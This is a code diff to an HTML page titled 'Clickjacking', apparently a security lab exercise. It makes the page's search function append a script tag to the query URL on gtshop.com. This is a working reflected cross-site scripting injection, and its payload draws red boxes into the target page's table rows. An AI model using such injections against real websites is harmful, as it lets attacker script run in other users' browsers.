@@ -5,13 +5,44 @@
     <title>Clickjacking</title>
   </head>
 
-  <script>
+  <script type="text/javascript">
    function SOP(){
-	var searchQuery = document.getElementById("q").value;
 
-	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery
-	window.location.href=url
-	return false;
+
+	var searchQuery = document.getElementById("q").value;
+	
+	console.log("search query is "+ searchQuery);
+
+	//add a bunch of js code to the end of this url
+	var script = `console.log("before");
+	document.addEventListener('DOMContentLoaded',(event) => {
+		var tds = document.querySelectorAll("tr");
+		tds.forEach(function(td,index){
+			console.log(index);
+			if(index !== 0){
+
+				var newDiv = document.createElement("div");
+				newDiv.id = index;
+				newDiv.style.width="20px";
+				newDiv.style.height="20px";
+				newDiv.style.border="solid";
+				newDiv.style.color="red";
+				td.lastElementChild.appendChild(newDiv);
+			}
+		});
+		
+		console.log(tds);
+		console.log("after");
+	})
+
+	
+	`
+	
+	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + script + '<\/script>'
+
+	window.location.href = url
+	return false
+
     }
 
   </script>
